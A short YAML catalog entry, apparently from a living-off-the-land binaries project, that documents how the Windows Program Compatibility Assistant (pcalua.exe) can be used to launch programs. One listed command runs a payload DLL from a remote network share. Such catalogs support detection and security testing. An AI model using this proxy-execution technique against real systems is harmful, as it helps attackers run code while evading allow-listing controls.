---
Name: Pcalua.exe
Description: Execute
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: pcalua.exe -a calc.exe
    Description: Open the target .EXE using the Program Compatibility Assistant.
  - Command: pcalua.exe -a \\server\payload.dll
    Description: Open the target .DLL file with the Program Compatibilty Assistant.
  - Command: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
    Description: Open the target .CPL file with the Program Compatibility Assistant.
Full Path:
  - c:\windows\system32\pcalua.exe
Code Sample: []
Detection: []
Resources:
  - https://twitter.com/KyleHanslovan/status/912659279806640128
Notes: |
    Thanks to:
    fab - @0rbz_
    Kyle Hanslovan - @KyleHanslovan
---
